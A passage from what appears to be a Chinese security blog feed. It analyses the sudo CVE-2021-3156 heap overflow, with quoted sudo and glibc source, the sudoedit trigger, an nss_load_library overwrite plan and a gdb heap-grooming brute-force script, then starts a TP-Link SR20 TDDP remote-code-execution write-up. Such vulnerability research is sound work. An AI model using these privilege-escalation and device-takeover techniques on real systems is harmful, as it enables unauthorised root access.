class="literal">NULL</span>;</span><br><span class="line">valid_flags = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (!mode)     <span class="comment">//[1]</span></span><br><span class="line">    mode = MODE_RUN;<span class="comment">/* running a command */</span></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>这里可以看到mode 置 MODE_RUN只有 在switch里面，mode没有赋值，也就是为0的时候才会 赋值 MODE_RUN</p><p>所以 只要前面 设置了 mode的值 不等于0，就不会触发[1]，进入到里面赋值</p><p>所以 就不会转义，那 <code>\</code> 就是 不转义传进去</p><p>然后 如何进入到</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">   <span class="keyword">if</span> (ISSET(sudo_mode, MODE_SHELL|MODE_LOGIN_SHELL)) &#123;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * When running a command via a shell, the sudo front-end</span></span><br><span class="line"><span class="comment"> * escapes potential meta chars.  We unescape non-spaces</span></span><br><span class="line"><span class="comment"> * for sudoers matching and logging purposes.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">for</span> (to = user_args, av = NewArgv + <span class="number">1</span>; (from = *av); av++) &#123;</span><br><span class="line">    <span class="keyword">while</span> (*from) &#123;</span><br><span class="line"><span class="keyword">if</span> (from[<span class="number">0</span>] == <span class="string">'\\'</span> &amp;&amp; !<span class="built_in">isspace</span>((<span class="keyword">unsigned</span> <span class="keyword">char</span>)from[<span class="number">1</span>]))</span><br><span class="line">    from++;</span><br><span class="line">*to++ = *from++;</span><br><span class="line">    &#125;</span><br><span class="line">    *to++ = <span class="string">' '</span>;</span><br><span class="line">&#125;</span><br><span class="line">*--to = <span class="string">'\0'</span>;</span><br></pre></td></tr></table></figure><p>进入也要满足两个mode其中 一个就能进入了，一个是MODE_SHELL 另一个是 MODE_LOGIN_SHELL</p><p>MODE_SHELL 可以用 <code>-s</code> 参数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> <span class="string">'S'</span>:</span><br><span class="line">    SET(tgetpass_flags, TGP_STDIN);</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">'s'</span>:</span><br><span class="line">    sudo_settings[ARG_USER_SHELL].value = <span class="string">"true"</span>;</span><br><span class="line">    SET(flags, MODE_SHELL);</span><br><span class="line">    <span class="keyword">break</span>;</span><br></pre></td></tr></table></figure><p>这里还有一个检测</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">   <span class="keyword">if</span> ((argc == <span class="number">0</span> &amp;&amp; mode == MODE_EDIT) ||</span><br><span class="line">(argc &gt; <span class="number">0</span> &amp;&amp; !ISSET(mode, MODE_RUN | MODE_EDIT | MODE_CHECK)))</span><br><span class="line">usage(<span class="number">1</span>);</span><br><span class="line">   <span class="keyword">if</span> (argc == <span class="number">0</span> &amp;&amp; mode == MODE_RUN &amp;&amp; !ISSET(flags, MODE_SHELL)) &#123;</span><br><span class="line">SET(flags, (MODE_IMPLIED_SHELL | MODE_SHELL));</span><br><span class="line">sudo_settings[ARG_IMPLIED_SHELL].value = <span class="string">"true"</span>;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>如果  (argc &gt; 0 &amp;&amp; !ISSET(mode, MODE_RUN | MODE_EDIT | MODE_CHECK))</p><p>参数的个数大于 0 但 没有 set 这三种 mode ，就会打印出 usage，也就等于退出了</p><p>然后往上查找 <code>MODE_EDIT</code>  这个mode</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">   <span class="keyword">if</span> (proglen &gt; <span class="number">4</span> &amp;&amp; <span class="built_in">strcmp</span>(progname + proglen - <span class="number">4</span>, <span class="string">"edit"</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">progname = <span class="string">"sudoedit"</span>;</span><br><span class="line">mode = MODE_EDIT;</span><br><span class="line">sudo_settings[ARG_SUDOEDIT].value = <span class="string">"true"</span>;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>这里刚刚好，就有一个，也就是说要用sudoedit来启动，看了下sudoedit</p><p>其实就是sudo的一个链接</p><p>然后上面都满足了，接下来就是构造exp，这里利用的是<a href="https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt" target="_blank" rel="noopener">wp</a>这里说的第二种</p><h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>要利用这个函数  nss_load_library </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">int</span></span><br><span class="line">nss_load_library (service_user *ni)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (ni-&gt;library == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* This service has not yet been used.  Fetch the service</span></span><br><span class="line"><span class="comment"> library for it, creating a new one if need be.  If there</span></span><br><span class="line"><span class="comment"> is no service table from the file, this static variable</span></span><br><span class="line"><span class="comment"> holds the head of the service_library list made from the</span></span><br><span class="line"><span class="comment"> default configuration.  */</span></span><br><span class="line">      <span class="keyword">static</span> name_database default_table;</span><br><span class="line">      ni-&gt;library = nss_new_service (service_table ?: &amp;default_table,</span><br><span class="line">     ni-&gt;name);</span><br><span class="line">      <span class="keyword">if</span> (ni-&gt;library == <span class="literal">NULL</span>)</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (ni-&gt;library-&gt;lib_handle == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* Load the shared library.  */</span></span><br><span class="line">      <span class="keyword">size_t</span> shlen = (<span class="number">7</span> + <span class="built_in">strlen</span> (ni-&gt;name) + <span class="number">3</span></span><br><span class="line">      + <span class="built_in">strlen</span> (__nss_shlib_revision) + <span class="number">1</span>);</span><br><span class="line">      <span class="keyword">int</span> saved_errno = errno;</span><br><span class="line">      <span class="keyword">char</span> shlib_name[shlen];</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* Construct shared object name.  */</span></span><br><span class="line">      __stpcpy (__stpcpy (__stpcpy (__stpcpy (shlib_name,</span><br><span class="line">      <span class="string">"libnss_"</span>),</span><br><span class="line">    ni-&gt;name),</span><br><span class="line">  <span class="string">".so"</span>),</span><br><span class="line">__nss_shlib_revision);</span><br><span class="line"></span><br><span class="line">      ni-&gt;library-&gt;lib_handle = __libc_dlopen (shlib_name);</span><br><span class="line">      <span class="keyword">if</span> (ni-&gt;library-&gt;lib_handle == <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/* Failed to load the library.  */</span></span><br><span class="line">  ni-&gt;library-&gt;lib_handle = (<span class="keyword">void</span> *) <span class="number">-1l</span>;</span><br><span class="line">  __set_errno (saved_errno);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta"># <span class="meta-keyword">ifdef</span> USE_NSCD</span></span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">if</span> (is_nscd)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/* Call the init function when nscd is used.  */</span></span><br><span class="line">  <span class="keyword">size_t</span> initlen = (<span class="number">5</span> + <span class="built_in">strlen</span> (ni-&gt;name)</span><br><span class="line">    + <span class="built_in">strlen</span> (<span class="string">"_init"</span>) + <span class="number">1</span>);</span><br><span class="line">  <span class="keyword">char</span> init_name[initlen];</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Construct the init function name.  */</span></span><br><span class="line">  __stpcpy (__stpcpy (__stpcpy (init_name,</span><br><span class="line"><span class="string">"_nss_"</span>),</span><br><span class="line">      ni-&gt;name),</span><br><span class="line">    <span class="string">"_init"</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Find the optional init function.  */</span></span><br><span class="line">  <span class="keyword">void</span> (*ifct) (<span class="keyword">void</span> (*) (<span class="keyword">size_t</span>, struct traced_file *))</span><br><span class="line">    = __libc_dlsym (ni-&gt;library-&gt;lib_handle, init_name);</span><br><span class="line">  <span class="keyword">if</span> (ifct != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">void</span> (*cb) (<span class="keyword">size_t</span>, struct traced_file *) = nscd_init_cb;</span><br><span class="line"><span class="meta">#  <span class="meta-keyword">ifdef</span> PTR_DEMANGLE</span></span><br><span class="line">      PTR_DEMANGLE (cb);</span><br><span class="line"><span class="meta">#  <span class="meta-keyword">endif</span></span></span><br><span class="line">      ifct (cb);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta"># <span class="meta-keyword">endif</span></span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个函数存在于libc中，用来解析一些so的</p><p>但是为什么选这个？，因为这个内存 与 bin上的tache 非常近，在进行copy的时候，会malloc一次，而malloc的size由我们控制着，size就是参数的size</p><p>下面是三个设计到的结构体</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">service_user</span><br><span class="line">name_database_entry</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">service_user</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="comment">/* And the link to the next entry.  */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">service_user</span> *<span class="title">next</span>;</span></span><br><span class="line">  <span class="comment">/* Action according to result.  */</span></span><br><span class="line">  lookup_actions actions[<span class="number">5</span>];</span><br><span class="line">  <span class="comment">/* Link to the underlying library object.  */</span></span><br><span class="line">  service_library *library;</span><br><span class="line">  <span class="comment">/* Collection of known functions.  */</span></span><br><span class="line">  <span class="keyword">void</span> *known;</span><br><span class="line">  <span class="comment">/* Name of the service (`files', `dns', `nis', ...).  */</span></span><br><span class="line">  <span class="keyword">char</span> name[<span class="number">0</span>];</span><br><span class="line">&#125; service_user;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* To access the action based on the status value use this macro.  */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> nss_next_action(ni, status) ((ni)-&gt;actions[2 + status])</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">name_database_entry</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="comment">/* And the link to the next entry.  */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">name_database_entry</span> *<span class="title">next</span>;</span></span><br><span class="line">  <span class="comment">/* List of service to be used.  */</span></span><br><span class="line">  service_user *service;</span><br><span class="line">  <span class="comment">/* Name of the database.  */</span></span><br><span class="line">  <span class="keyword">char</span> name[<span class="number">0</span>];</span><br><span class="line">&#125; name_database_entry;</span><br></pre></td></tr></table></figure><p>这个两个结构体</p><p>在 nss_load_library 函数里面 有一个 这样的函数  __libc_dlopen ，这个函数执行的时候，会加载 一个so文件，然后会调用init </p><p>然后就是进入的路径了</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">int</span></span><br><span class="line">nss_load_library (service_user *ni)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (ni-&gt;library == <span class="literal">NULL</span>)<span class="comment">//[1]</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* This service has not yet been used.  Fetch the service</span></span><br><span class="line"><span class="comment"> library for it, creating a new one if need be.  If there</span></span><br><span class="line"><span class="comment"> is no service table from the file, this static variable</span></span><br><span class="line"><span class="comment"> holds the head of the service_library list made from the</span></span><br><span class="line"><span class="comment"> default configuration.  */</span></span><br><span class="line">      <span class="keyword">static</span> name_database default_table;</span><br><span class="line">      ni-&gt;library = nss_new_service (service_table ?: &amp;default_table,</span><br><span class="line">     ni-&gt;name);<span class="comment">//[2]</span></span><br><span class="line">      <span class="keyword">if</span> (ni-&gt;library == <span class="literal">NULL</span>)</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (ni-&gt;library-&gt;lib_handle == <span class="literal">NULL</span>)<span class="comment">//[3]</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* Load the shared library.  */</span></span><br><span class="line">      <span class="keyword">size_t</span> shlen = (<span class="number">7</span> + <span class="built_in">strlen</span> (ni-&gt;name) + <span class="number">3</span></span><br><span class="line">      + <span class="built_in">strlen</span> (__nss_shlib_revision) + <span class="number">1</span>);</span><br><span class="line">      <span class="keyword">int</span> saved_errno = errno;</span><br><span class="line">      <span class="keyword">char</span> shlib_name[shlen];</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* Construct shared object name.  */</span></span><br><span class="line">      __stpcpy (__stpcpy (__stpcpy (__stpcpy (shlib_name,</span><br><span class="line">      <span class="string">"libnss_"</span>),</span><br><span class="line">    ni-&gt;name),</span><br><span class="line">  <span class="string">".so"</span>),</span><br><span class="line">__nss_shlib_revision);<span class="comment">//[4]</span></span><br><span class="line"></span><br><span class="line">      ni-&gt;library-&gt;lib_handle = __libc_dlopen (shlib_name);<span class="comment">//[5]</span></span><br></pre></td></tr></table></figure><p>进入 [1] 然后 进入到 [2] 这时候的 library 是一个new的 然后 handle就肯定是 0了</p><p>然后 就是下面了</p><p>[4] 组合一个文件名，ni-&gt;name 我们控制，然后就组成我们想要的名字了</p><p>然后 就是[5]了，在那个so 写好init 来进行提权就ok了</p><h3 id="遇到的问题"><a href="#遇到的问题" class="headerlink" title="遇到的问题"></a>遇到的问题</h3><p>1、在service_user结构体和 tcache之间出现</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">service_user 这个结构体</span><br><span class="line">name_database_entry    </span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">service_user</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="comment">/* And the link to the next entry.  */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">service_user</span> *<span class="title">next</span>;</span></span><br><span class="line">  <span class="comment">/* Action according to result.  */</span></span><br><span class="line">  lookup_actions actions[<span class="number">5</span>];</span><br><span class="line">  <span class="comment">/* Link to the underlying library object.  */</span></span><br><span class="line">  service_library *library;</span><br><span class="line">  <span class="comment">/* Collection of known functions.  */</span></span><br><span class="line">  <span class="keyword">void</span> *known;</span><br><span class="line">  <span class="comment">/* Name of the service (`files', `dns', `nis', ...).  */</span></span><br><span class="line">  <span class="keyword">char</span> name[<span class="number">0</span>];</span><br><span class="line">&#125; service_user;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* To access the action based on the status value use this macro.  */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> nss_next_action(ni, status) ((ni)-&gt;actions[2 + status])</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">name_database_entry</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="comment">/* And the link to the next entry.  */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">name_database_entry</span> *<span class="title">next</span>;</span></span><br><span class="line">  <span class="comment">/* List of service to be used.  */</span></span><br><span class="line">  service_user *service;</span><br><span class="line">  <span class="comment">/* Name of the database.  */</span></span><br><span class="line">  <span class="keyword">char</span> name[<span class="number">0</span>];</span><br><span class="line">&#125; name_database_entry;</span><br></pre></td></tr></table></figure><p>这个结构体 这个两个结构体不好覆盖 ，怎么说呢  service_user 这个结构体涉及到一个链表结构，修改了next就回不去，下一个要解析的是systemd</p><p>如果next指针修改了就访问不到 systemd ，就算修改了 sysemd 为 X/X 也没什么用，这时候就要打乱堆的分配</p><p>然后 有个这样的</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">setlocale(LC_ALL, &quot;&quot;);</span><br></pre></td></tr></table></figure><p>在main下面一点点</p><p>这个会为 LC_开头的 环境变量分配内存，然后free掉</p><p>这时候就可以打乱堆中的分配使得</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">service_user</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="comment">/* And the link to the next entry.  */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">service_user</span> *<span class="title">next</span>;</span></span><br><span class="line">  <span class="comment">/* Action according to result.  */</span></span><br><span class="line">  lookup_actions actions[<span class="number">5</span>];</span><br><span class="line">  <span class="comment">/* Link to the underlying library object.  */</span></span><br><span class="line">  service_library *library;</span><br><span class="line">  <span class="comment">/* Collection of known functions.  */</span></span><br><span class="line">  <span class="keyword">void</span> *known;</span><br><span class="line">  <span class="comment">/* Name of the service (`files', `dns', `nis', ...).  */</span></span><br><span class="line">  <span class="keyword">char</span> name[<span class="number">0</span>];</span><br><span class="line">&#125; service_user;c</span><br></pre></td></tr></table></figure><p>这个结构体在 tcache中的bin的下面</p><p>但这个。。还是得fuzz，或者爆破</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gdb</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line">gdb.execute(<span class="string">'file /usr/bin/sudoedit'</span>)</span><br><span class="line">payload = <span class="string">"set args -s 'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\\'"</span></span><br><span class="line">gdb.execute(payload)</span><br><span class="line"></span><br><span class="line">gdb.execute(<span class="string">"b *0x00007ffff5b85c88"</span>)</span><br><span class="line">gdb.execute(<span class="string">"b *0x0000555555559674"</span>)</span><br><span class="line"><span class="comment">#gdb.execute("b sudo.c:155")</span></span><br><span class="line"><span class="comment">#gdb.execute("b *0x7ffff7ec4152")</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.execute("dis 3")</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">20</span>,<span class="number">0x100</span>):</span><br><span class="line">    payload = <span class="string">'a'</span>*i</span><br><span class="line">    gdb.execute(<span class="string">"set environment LC_ALL C.UTF-8@"</span>+payload)</span><br><span class="line">    gdb.execute(<span class="string">"dis 1"</span>)</span><br><span class="line">    gdb.execute(<span class="string">"r"</span>)</span><br><span class="line">    gdb.execute(<span class="string">"en 1"</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        s = gdb.execute(<span class="string">"search -s systemd"</span>,to_string=<span class="literal">True</span>)</span><br><span class="line">        a1=int(s[<span class="number">32</span>:<span class="number">32</span>+<span class="number">12</span>],<span class="number">16</span>)</span><br><span class="line">        a2=int(s[<span class="number">114</span>:<span class="number">114</span>+<span class="number">12</span>],<span class="number">16</span>)</span><br><span class="line">        print(<span class="string">"[*] "</span>+str(i))</span><br><span class="line">        print(<span class="string">"[-] "</span>+str(hex(a1)))</span><br><span class="line">        print(<span class="string">"[-] "</span>+str(hex(a2)))</span><br><span class="line">        print(<span class="string">"[=] "</span>+str(hex(int(s[<span class="number">114</span>:<span class="number">114</span>+<span class="number">12</span>],<span class="number">16</span>)-int(s[<span class="number">32</span>:<span class="number">32</span>+<span class="number">12</span>],<span class="number">16</span>))))</span><br><span class="line">        <span class="keyword">if</span> a2-a1 &gt;<span class="number">0xa0</span>:</span><br><span class="line">            f= open(str(i)+<span class="string">'.log2'</span>,<span class="string">'w+'</span>)</span><br><span class="line">            f.write(s)</span><br><span class="line">            f.close()</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.execute('quit')</span></span><br></pre></td></tr></table></figure><p>用生成的文件，然后再一个调试</p><p>未完，待续</p><p>参考链接</p><p><a href="https://www.kalmarunionen.dk/writeups/sudo/" target="_blank" rel="noopener">writeup</a></p><p><a href="https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt" target="_blank" rel="noopener">baron</a></p>]]></content>
    
    <summary type="html">
    
      &lt;center&gt;&lt;font size=&quot;5&quot;&gt;info&lt;/font&gt;&lt;/center&gt;
    
    </summary>
    
    
      <category term="pwn" scheme="https://leave-Devour.github.io/categories/pwn/"/>
    
    
      <category term="CVE" scheme="https://leave-Devour.github.io/tags/CVE/"/>
    
  </entry>
  
  <entry>
    <title>TP Link SR20 ACE漏洞分析</title>
    <link href="https://leave-devour.github.io/2020/08/04/TP-Link-SR20-ACE%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    <id>https://leave-devour.github.io/2020/08/04/TP-Link-SR20-ACE%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</id>
    <published>2020-08-04T01:31:26.000Z</published>
    <updated>2020-08-04T01:40:43.981Z</updated>
    
    <content type="html"><![CDATA[<center><font size="5">info</font></center><a id="more"></a><p>漏洞的基理为：TP-Link SR20 设备运行了 V1 版本的 TDDP 协议，V1 版本无需认证，只需往 SR20 设备的 UDP 1040 端口发送数据，且数据的第二字节为 <code>0x31</code> 时，SR20 设备会连接发送该请求设备的 TFTP 服务下载相应的文件并使用 LUA 解释器以 root 权限来执行，这就导致存在远程代码执行漏洞</p><p>固件下载地址：<a href="https://www.tp-link.com/us/support/download/sr20/#Firmware" target="_blank" rel="noopener">SP20</a></p><p><img src="/images/image-20200803172348831.png" alt="image-20200803172348831"></p><p>TDDP协议的逆向分析 [Reverse Engineering the TP-Link HS110]([<a href="https://www.softscheck.com/en/reverse-engineering-tp-link-hs110/#TP-Link%20Device%20Debug%20Protocol]" target="_blank" rel="noopener">https://www.softscheck.com/en/reverse-engineering-tp-link-hs110/#TP-Link%20Device%20Debug%20Protocol]</a>(<a href="https://www.softscheck.com/en/reverse-engineering-tp-link-hs110/#TP-Link" target="_blank" rel="noopener">https://www.softscheck.com/en/reverse-engineering-tp-link-hs110/#TP-Link</a> Device Debug Protocol))</p><p><a href="https://www.troopers.de/downloads/troopers17/TR17_fgont_-iot_tp_link_hacking.pdf" target="_blank" rel="noopener">pdf</a></p><p><img src="/images/image-20200803172506223.png" alt="image-20200803172506223"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">第一个字节是版本号，第二个是类型</span><br></pre></td></tr></table></figure><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>先安装<code>lua</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">curl -R -O http://www.lua.org/ftp/lua-5.3.0.tar.gz</span><br><span class="line">tar zxf lua-5.3.0.tar.gz</span><br><span class="line"><span class="built_in">cd</span> lua-5.3.0</span><br><span class="line">make linux <span class="built_in">test</span></span><br><span class="line">make install</span><br><span class="line"><span class="comment">#curl 慢的可以下载好再拖进虚拟机</span></span><br></pre></td></tr></table></figure><p>然后就安装<code>tftp</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install atftpd ftp  openbsd-inetd libreadline-dev</span><br></pre></td></tr></table></figure><p>然后配置 <code>/ect/default/atftpd</code></p><figure class="highlight 